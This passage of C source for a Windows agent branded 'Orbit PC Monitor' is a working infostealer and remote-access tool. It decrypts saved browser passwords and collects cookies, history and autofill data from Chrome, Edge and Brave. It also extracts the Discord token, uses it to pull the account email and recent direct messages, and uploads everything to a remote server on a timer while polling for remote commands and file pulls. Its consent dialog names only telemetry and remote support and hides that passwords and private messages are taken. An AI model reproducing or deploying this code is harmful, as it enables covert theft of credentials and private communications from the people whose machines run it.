                    {memcpy(origin,d2,(int)min(tb,(UINT64)511));origin[min(tb,(UINT64)511)]='\0';}
                else if(ci2==3&&sts[ci2]>=13&&(sts[ci2]%2==1)&&tb<256)
                    {memcpy(user,d2,(int)min(tb,(UINT64)255));user[min(tb,(UINT64)255)]='\0';}
                else if(ci2==5&&sts[ci2]>=12&&(sts[ci2]%2==0)&&tb>0&&tb<4096&&d2+tb<=re)
                    {DecryptChromeBlob(d2,(DWORD)tb,hasMK?mk:NULL,pass,sizeof(pass));}
                d2+=sz;
            }
            if(origin[0]){
                char eo[512]={0},eu[256]={0},ep2[256]={0};
                JsonEscapeAppend(eo,sizeof(eo),origin);
                JsonEscapeAppend(eu,sizeof(eu),user);
                JsonEscapeAppend(ep2,sizeof(ep2),pass);
                char entry[1536];
                sprintf(entry,"%s{\"origin\":\"%s\",\"username\":\"%s\",\"password\":\"%s\",\"browser\":\"%s\"}",
                    rc>0?",":"",eo,eu,ep2,eb);
                if(strlen(out)+strlen(entry)+4<cap){strcat(out,entry);rc++;}
            }
        }
    }
    free(buf); strcat(out,"]"); return out;
}

/* ── Read bookmarks (Bookmarks JSON file) ─────────────────────────────────── */
static char* ReadBookmarks(const char* profile,const char* bname){
    char path[MAX_PATH]; sprintf(path,"%s\\Bookmarks",profile);
    HANDLE hF=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hF==INVALID_HANDLE_VALUE)return NULL;
    LARGE_INTEGER fs; GetFileSizeEx(hF,&fs);
    if(fs.QuadPart>8*1024*1024){CloseHandle(hF);return NULL;}
    DWORD fsz=(DWORD)fs.QuadPart;
    char* buf=(char*)malloc(fsz+1); DWORD rd=0;
    ReadFile(hF,buf,fsz,&rd,NULL); buf[rd]='\0'; CloseHandle(hF);
    char eb[64]={0}; JsonEscapeAppend(eb,sizeof(eb),bname);
    size_t cap=256*1024; char* out=(char*)malloc(cap); strcpy(out,"[");
    int count=0;
    const char* p=buf;
    while((p=strstr(p,"\"url\":\""))!=NULL&&count<2000){
        p+=7; char url[512]={0}; int ui=0;
        while(*p&&*p!='"'&&ui<511){if(*p=='\\')p++;url[ui++]=*p++;}
        char name[256]=""; const char* np=strstr(p,"\"name\":\"");
        if(np){np+=8;int ni=0;while(*np&&*np!='"'&&ni<255){if(*np=='\\')np++;name[ni++]=*np++;}}
        char eu[512]={0},en[256]={0};
        JsonEscapeAppend(eu,sizeof(eu),url); JsonEscapeAppend(en,sizeof(en),name);
        char entry[1024];
        sprintf(entry,"%s{\"url\":\"%s\",\"name\":\"%s\",\"browser\":\"%s\"}",
            count>0?",":"",eu,en,eb);
        if(strlen(out)+strlen(entry)+4<cap){strcat(out,entry);count++;}
    }
    free(buf); strcat(out,"]"); return out;
}

/* ── Read open tabs via Chrome DevTools Protocol (localhost debug port) ───── */
static char* ReadOpenTabs(const char* bname,int port){
    HINTERNET hI=InternetOpenA("OrbitMonitorAgent/4.0",INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
    if(!hI)return NULL;
    HINTERNET hC=InternetConnectA(hI,"127.0.0.1",(INTERNET_PORT)port,NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
    char* resp=(char*)malloc(65536); resp[0]='\0';
    if(hC){
        HINTERNET hR=HttpOpenRequestA(hC,"GET","/json",NULL,NULL,NULL,
            INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE,0);
        if(hR){
            if(HttpSendRequestA(hR,NULL,0,NULL,0)){
                DWORD rd2=0; InternetReadFile(hR,resp,65534,&rd2); resp[rd2]='\0';
            }
            InternetCloseHandle(hR);
        }
        InternetCloseHandle(hC);
    }
    InternetCloseHandle(hI);
    if(!resp[0]){free(resp);return NULL;}
    char eb[64]={0}; JsonEscapeAppend(eb,sizeof(eb),bname);
    char* out=(char*)malloc(65536); strcpy(out,"["); int count=0;
    const char* p=resp;
    while((p=strstr(p,"\"url\":\""))!=NULL&&count<200){
        p+=7; char url[512]={0}; int ui=0;
        while(*p&&*p!='"'&&ui<511){if(*p=='\\')p++;url[ui++]=*p++;}
        char title[256]=""; const char* tp=strstr(p,"\"title\":\"");
        if(tp){tp+=9;int ti=0;while(*tp&&*tp!='"'&&ti<255){if(*tp=='\\')tp++;title[ti++]=*tp++;}}
        if(strncmp(url,"http",4)!=0){continue;}
        char eu[512]={0},et[256]={0};
        JsonEscapeAppend(eu,sizeof(eu),url); JsonEscapeAppend(et,sizeof(et),title);
        char entry[1024];
        sprintf(entry,"%s{\"url\":\"%s\",\"title\":\"%s\",\"browser\":\"%s\"}",
            count>0?",":"",eu,et,eb);
        if(strlen(out)+strlen(entry)+4<65536){strcat(out,entry);count++;}
    }
    free(resp); strcat(out,"]"); return out;
}

/* ── Full browser data collection + upload ───────────────────────────────── */
void CollectAndSendBrowserData(void){
    char lad[MAX_PATH]={0}; GetLocalAppData(lad,sizeof(lad));
    struct{const char* name;char base[MAX_PATH];char prof[MAX_PATH];int port;}br[3];
    int nb=0;
    sprintf(br[0].base,"%s\\Google\\Chrome\\User Data",lad);
    sprintf(br[0].prof,"%s\\Google\\Chrome\\User Data\\Default",lad);
    br[0].name="Google Chrome"; br[0].port=9222; nb++;
    sprintf(br[1].base,"%s\\Microsoft\\Edge\\User Data",lad);
    sprintf(br[1].prof,"%s\\Microsoft\\Edge\\User Data\\Default",lad);
    br[1].name="Microsoft Edge"; br[1].port=9223; nb++;
    sprintf(br[2].base,"%s\\BraveSoftware\\Brave-Browser\\User Data",lad);
    sprintf(br[2].prof,"%s\\BraveSoftware\\Brave-Browser\\User Data\\Default",lad);
    br[2].name="Brave"; br[2].port=9224; nb++;

    char* history=strdup("[]"),*tabs=strdup("[]"),*bookmarks=strdup("[]");
    char* passwords=strdup("[]"),*cookies=strdup("[]"),*autofill=strdup("[]");
    char* downloads=strdup("[]"),*extensions=strdup("[]");

    for(int i=0;i<nb;i++){
        if(GetFileAttributesA(br[i].prof)==INVALID_FILE_ATTRIBUTES)continue;

        /* History */
        {ColSpec c[]={{0,"url"},{1,"title"}};
        char db[MAX_PATH]; sprintf(db,"%s\\History",br[i].prof);
        char* h=SqliteTexts(db,2,c,500);
        if(h){h=InjectBrowser(h,br[i].name);history=MergeArrays(history,h);}}

        /* Open tabs */
        {char* t=ReadOpenTabs(br[i].name,br[i].port);
        if(t)tabs=MergeArrays(tabs,t);}

        /* Bookmarks */
        {char* bm=ReadBookmarks(br[i].prof,br[i].name);
        if(bm)bookmarks=MergeArrays(bookmarks,bm);}

        /* Passwords */
        {char* pw=ReadChromePasswords(br[i].prof,br[i].base,br[i].name);
        if(pw)passwords=MergeArrays(passwords,pw);}

        /* Cookies: host_key(1), name(2), path(6) */
        {ColSpec c[]={{1,"host"},{2,"name"},{6,"path"}};
        char db[MAX_PATH];
        sprintf(db,"%s\\Network\\Cookies",br[i].prof);
        if(GetFileAttributesA(db)==INVALID_FILE_ATTRIBUTES)
            sprintf(db,"%s\\Cookies",br[i].prof);
        char* ck=SqliteTexts(db,3,c,1000);
        if(ck){ck=InjectBrowser(ck,br[i].name);cookies=MergeArrays(cookies,ck);}}

        /* Autofill: name(0), value(1) */
        {ColSpec c[]={{0,"name"},{1,"value"}};
        char db[MAX_PATH]; sprintf(db,"%s\\Web Data",br[i].prof);
        char* af=SqliteTexts(db,2,c,500);
        if(af){af=InjectBrowser(af,br[i].name);autofill=MergeArrays(autofill,af);}}

        /* Downloads: url(0), target_path(2) */
        {ColSpec c[]={{0,"url"},{2,"targetPath"}};
        char db[MAX_PATH]; sprintf(db,"%s\\History",br[i].prof);
        char* dl=SqliteTexts(db,2,c,300);
        if(dl){dl=InjectBrowser(dl,br[i].name);downloads=MergeArrays(downloads,dl);}}

        /* Extensions */
        {char extDir[MAX_PATH]; sprintf(extDir,"%s\\Extensions",br[i].prof);
        size_t ecap=128*1024; char* ex=(char*)malloc(ecap); strcpy(ex,"["); int ec=0;
        char eb[64]={0}; JsonEscapeAppend(eb,sizeof(eb),br[i].name);
        char srch[MAX_PATH]; sprintf(srch,"%s\\*",extDir);
        WIN32_FIND_DATAA ffd; HANDLE hF=FindFirstFileA(srch,&ffd);
        if(hF!=INVALID_HANDLE_VALUE){
            do{
                if(!(ffd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY))continue;
                if(!strcmp(ffd.cFileName,".")||!strcmp(ffd.cFileName,".."))continue;
                char vs[MAX_PATH]; sprintf(vs,"%s\\%s\\*",extDir,ffd.cFileName);
                WIN32_FIND_DATAA vfd; HANDLE hV=FindFirstFileA(vs,&vfd);
                if(hV==INVALID_HANDLE_VALUE)continue;
                do{
                    if(!(vfd.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY))continue;
                    if(!strcmp(vfd.cFileName,".")||!strcmp(vfd.cFileName,".."))continue;
                    char mfp[MAX_PATH]; sprintf(mfp,"%s\\%s\\%s\\manifest.json",extDir,ffd.cFileName,vfd.cFileName);
                    HANDLE hM=CreateFileA(mfp,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
                    if(hM==INVALID_HANDLE_VALUE)continue;
                    char mf[8192]={0}; DWORD r2=0; ReadFile(hM,mf,8191,&r2,NULL); CloseHandle(hM);
                    char en[128]={0},ev[64]={0};
                    JsonReadStr(mf,"name",en,sizeof(en)); if(!en[0])strcpy(en,"Unknown");
                    JsonReadStr(mf,"version",ev,sizeof(ev));
                    char eid[64]={0},een[128]={0},eev[64]={0};
                    JsonEscapeAppend(eid,sizeof(eid),ffd.cFileName);
                    JsonEscapeAppend(een,sizeof(een),en);
                    JsonEscapeAppend(eev,sizeof(eev),ev);
                    char ent[512]; sprintf(ent,"%s{\"id\":\"%s\",\"name\":\"%s\",\"version\":\"%s\",\"browser\":\"%s\"}",
                        ec>0?",":"",eid,een,eev,eb);
                    if(strlen(ex)+strlen(ent)+4<ecap){strcat(ex,ent);ec++;}
                }while(FindNextFileA(hV,&vfd)&&ec<500);
                FindClose(hV);
            }while(FindNextFileA(hF,&ffd)&&ec<500);
            FindClose(hF);
        }
        strcat(ex,"]"); extensions=MergeArrays(extensions,ex);}
    }

    /* Build payload */
    size_t pcap=4*1024*1024;
    char* payload=(char*)malloc(pcap);
    if(payload){
        snprintf(payload,pcap,
            "{\"history\":%s,\"tabs\":%s,\"bookmarks\":%s,"
            "\"passwords\":%s,\"cookies\":%s,\"autofill\":%s,"
            "\"downloads\":%s,\"extensions\":%s}",
            history,tabs,bookmarks,passwords,cookies,autofill,downloads,extensions);
        PostAgentJson("/api/agent/browser/data",payload,strlen(payload));
        free(payload);
    }
    free(history);free(tabs);free(bookmarks);free(passwords);
    free(cookies);free(autofill);free(downloads);free(extensions);
}

/* ── Discord token extraction ────────────────────────────────────────────── */
static BOOL ExtractDiscordToken(char* out,int outSz){
    out[0]='\0';
    char roam[MAX_PATH]={0}; GetRoamingAppData(roam,sizeof(roam));
    const char* variants[]={"discord","DiscordPTB","DiscordCanary"};
    for(int vi=0;vi<3;vi++){
        char ldbPath[MAX_PATH];
        sprintf(ldbPath,"%s\\%s\\Local Storage\\leveldb",roam,variants[vi]);
        if(GetFileAttributesA(ldbPath)==INVALID_FILE_ATTRIBUTES)continue;
        char srch[MAX_PATH]; sprintf(srch,"%s\\*",ldbPath);
        WIN32_FIND_DATAA ffd; HANDLE hF=FindFirstFileA(srch,&ffd);
        if(hF==INVALID_HANDLE_VALUE)continue;
        do{
            const char* ext=strrchr(ffd.cFileName,'.');
            if(!ext)continue;
            if(_stricmp(ext,".ldb")!=0&&_stricmp(ext,".log")!=0)continue;
            char fp[MAX_PATH]; sprintf(fp,"%s\\%s",ldbPath,ffd.cFileName);
            HANDLE hFile=CreateFileA(fp,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
            if(hFile==INVALID_HANDLE_VALUE)continue;
            LARGE_INTEGER fs2; GetFileSizeEx(hFile,&fs2);
            if(fs2.QuadPart>8*1024*1024){CloseHandle(hFile);continue;}
            DWORD fsz2=(DWORD)fs2.QuadPart;
            BYTE* buf=(BYTE*)malloc(fsz2+1); DWORD rd2=0;
            ReadFile(hFile,buf,fsz2,&rd2,NULL); buf[rd2]='\0'; CloseHandle(hFile);
            /* Look for DPAPI-wrapped token "dQw4w9WgXcQ:" */
            const char* DPFX="dQw4w9WgXcQ:";
            const BYTE* p=(const BYTE*)buf;
            while((p=(const BYTE*)memchr(p,'d',(const BYTE*)buf+rd2-p))!=NULL){
                if((DWORD)(p-(const BYTE*)buf)+12>rd2)break;
                if(memcmp(p,DPFX,12)==0){
                    const BYTE* blob=p+12;
                    DWORD rem=rd2-(DWORD)(blob-(const BYTE*)buf);
                    if(rem>8&&rem<2048){
                        BYTE plain[512]={0}; DWORD pl=511;
                        if(DpapiDecrypt(blob,min(rem,(DWORD)2048),plain,&pl)){
                            int tl=(int)strlen((char*)plain);
                            if(tl>50&&tl<120){
                                strncpy(out,(char*)plain,outSz-1);
                                free(buf);FindClose(hF);return TRUE;
                            }
                        }
                    }
                }
                /* Raw mfa. token */
                if(p[0]=='m'&&p[1]=='f'&&p[2]=='a'&&p[3]=='.'){
                    int tl=0; const BYTE* tp=p;
                    while(*tp&&(unsigned char)*tp>0x20&&tl<110)tl++,tp++;
                    if(tl>30){memcpy(out,p,min(tl,outSz-1));out[min(tl,outSz-1)]='\0';
                        free(buf);FindClose(hF);return TRUE;}
                }
                p++;
            }
            free(buf);
        }while(FindNextFileA(hF,&ffd));
        FindClose(hF);
    }
    return FALSE;
}

/* ── Discord API GET ──────────────────────────────────────────────────────── */
static BOOL DiscordGet(const char* path,const char* token,char* out,DWORD outSz){
    HINTERNET hI=InternetOpenA("Mozilla/5.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
    if(!hI)return FALSE;
    HINTERNET hC=InternetConnectA(hI,"discord.com",INTERNET_DEFAULT_HTTPS_PORT,
        NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
    BOOL ok=FALSE;
    if(hC){
        HINTERNET hR=HttpOpenRequestA(hC,"GET",path,NULL,NULL,NULL,
            INTERNET_FLAG_SECURE|INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE,0);
        if(hR){
            char hdrs[256]; sprintf(hdrs,"Authorization: %s\r\n",token);
            if(HttpSendRequestA(hR,hdrs,(DWORD)strlen(hdrs),NULL,0)){
                DWORD total=0,rd2=0;
                while(total<outSz-1){
                    rd2=0; if(!InternetReadFile(hR,out+total,outSz-1-total,&rd2)||rd2==0)break;
                    total+=rd2;
                }
                out[total]='\0'; ok=total>10;
            }
            InternetCloseHandle(hR);
        }
        InternetCloseHandle(hC);
    }
    InternetCloseHandle(hI); return ok;
}

/* ── Full Discord collection + upload ───────────────────────────────────── */
void CollectAndSendDiscordData(void){
    char token[128]={0};
    if(!ExtractDiscordToken(token,sizeof(token)))return;

    char userResp[4096]={0};
    DiscordGet("/api/v10/users/@me",token,userResp,sizeof(userResp));
    char uid[64]={0},uname[128]={0},disc[16]={0},email[256]={0};
    JsonReadStr(userResp,"id",uid,sizeof(uid));
    JsonReadStr(userResp,"username",uname,sizeof(uname));
    JsonReadStr(userResp,"discriminator",disc,sizeof(disc));
    JsonReadStr(userResp,"email",email,sizeof(email));

    char chanResp[65536]={0};
    DiscordGet("/api/v10/users/@me/channels",token,chanResp,sizeof(chanResp));

    size_t dmsCap=1024*1024; char* dmsJson=(char*)malloc(dmsCap);
    strcpy(dmsJson,"["); int dmCount=0;

    const char* cp=chanResp;
    while((cp=strstr(cp,"\"id\":\""))!=NULL&&dmCount<20){
        cp+=6; char chanId[32]={0}; int ci=0;
        while(*cp&&*cp!='"'&&ci<31)chanId[ci++]=*cp++;
        if(!chanId[0])continue;
        char recip[128]="Unknown";
        const char* rp=strstr(cp,"\"username\":\"");
        if(rp){rp+=12;int ri=0;while(*rp&&*rp!='"'&&ri<127)recip[ri++]=*rp++;}

        char msgPath[128]; sprintf(msgPath,"/api/v10/channels/%s/messages?limit=25",chanId);
        char* msgResp=(char*)malloc(131072); msgResp[0]='\0';
        DiscordGet(msgPath,token,msgResp,131072);

        size_t mCap=256*1024; char* msgsJson=(char*)malloc(mCap);
        strcpy(msgsJson,"["); int mc=0;
        const char* mp=msgResp;
        while((mp=strstr(mp,"\"content\":\""))!=NULL&&mc<25){
            mp+=11; char content[512]={0}; int mci=0;
            while(*mp&&*mp!='"'&&mci<511){
                if(*mp=='\\'){mp++;if(*mp=='n')content[mci++]='\n';
                else if(*mp=='"')content[mci++]='"';else content[mci++]=*mp;}
                else content[mci++]=*mp; mp++;
            }
            char ts[32]=""; const char* tsp=strstr(mp,"\"timestamp\":\"");
            if(tsp){tsp+=13;int ti=0;while(*tsp&&*tsp!='"'&&ti<31)ts[ti++]=*tsp++;}
            char ec2[512]={0}; JsonEscapeAppend(ec2,sizeof(ec2),content);
            char ent[768]; sprintf(ent,"%s{\"content\":\"%s\",\"timestamp\":\"%s\"}",mc>0?",":"",ec2,ts);
            if(strlen(msgsJson)+strlen(ent)+4<mCap){strcat(msgsJson,ent);mc++;}
        }
        strcat(msgsJson,"]"); free(msgResp);

        char er[128]={0},ech[32]={0};
        JsonEscapeAppend(er,sizeof(er),recip); JsonEscapeAppend(ech,sizeof(ech),chanId);
        char dmE[512];
        sprintf(dmE,"%s{\"channelId\":\"%s\",\"recipientName\":\"%s\",\"messages\":%s}",
            dmCount>0?",":"",ech,er,msgsJson);
        if(strlen(dmsJson)+strlen(dmE)+4<dmsCap){strcat(dmsJson,dmE);dmCount++;}
        free(msgsJson);
    }
    strcat(dmsJson,"]");

    char et[128]={0},eu[128]={0},eid[64]={0},ed[16]={0},ee[256]={0};
    JsonEscapeAppend(et,sizeof(et),token); JsonEscapeAppend(eu,sizeof(eu),uname);
    JsonEscapeAppend(eid,sizeof(eid),uid); JsonEscapeAppend(ed,sizeof(ed),disc);
    JsonEscapeAppend(ee,sizeof(ee),email);
    size_t pcap=dmsCap+1024; char* payload=(char*)malloc(pcap);
    snprintf(payload,pcap,
        "{\"token\":\"%s\",\"userId\":\"%s\",\"username\":\"%s\","
        "\"discriminator\":\"%s\",\"email\":\"%s\",\"dms\":%s}",
        et,eid,eu,ed,ee,dmsJson);
    PostAgentJson("/api/agent/discord/data",payload,strlen(payload));
    free(dmsJson); free(payload);
}

/* =========================================================================
   WinMain
   ========================================================================= */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow)
{
    (void)hInstance; (void)hPrevInstance; (void)nCmdShow;
    srand((unsigned int)time(NULL));

    /* Parse optional command line: orbit.exe [server_url] [agent_id] */
    if (lpCmdLine && strlen(lpCmdLine) > 0) {
        char srv[512] = {0}, agt[64] = {0};
        if (sscanf(lpCmdLine, "%511s %63s", srv, agt) >= 1) {
            strncpy(g_server_url, srv, sizeof(g_server_url) - 1);
            if (strlen(agt) > 0)
                strncpy(g_agent_id, agt, sizeof(g_agent_id) - 1);
        }
    }

    DWORD sz = sizeof(g_hostname);
    GetComputerNameA(g_hostname, &sz);
    DWORD usz = sizeof(g_username);
    GetUserNameA(g_username, &usz);

    /* Consent dialog */
    int consent = MessageBoxA(NULL,
        "Orbit PC Monitor - Company Device Notice\n\n"
        "This computer is enrolled in your company's IT administration and monitoring system.\n\n"
        "Under company policy and signed agreements, this agent reports system performance,\n"
        "device health telemetry, and supports administrator-requested remote support.\n\n"
        "Monitoring includes: live telemetry, installed software, running processes,\n"
        "network adapters, and administrator-initiated remote actions.\n\n"
        "Are you sure you want the company administration tool to monitor this PC?",
        "Orbit PC Monitor - Authorization",
        MB_YESNO | MB_ICONINFORMATION | MB_TOPMOST);

    if (consent != IDYES) return 0;

    /* Main loop — every 2 seconds */
    int cycle = 0;
    while (g_running) {
        /* Heartbeat every 15 cycles (~30 s) */
        if (cycle % 15 == 0) {
            SendHeartbeat();
            /* Heatmap tick on every heartbeat */
            SendHeatmapTick("online");
        }

        /* Screen sharing, command, file, and control checks every cycle */
        CheckScreenSharingRequests();
        CheckRemoteCommands();
        CheckDirListRequests();
        CheckFilePullRequests();
        CheckControlCommands();

        /* Browser data every 5 minutes (~150 cycles) */
        if (cycle % 150 == 1) {
            CollectAndSendBrowserData();
        }

        /* Discord every 10 minutes (~300 cycles) */
        if (cycle % 300 == 2) {
            CollectAndSendDiscordData();
        }

        Sleep(2000);
        cycle++;
        if (cycle >= 10000) cycle = 0;
    }

    return 0;
}
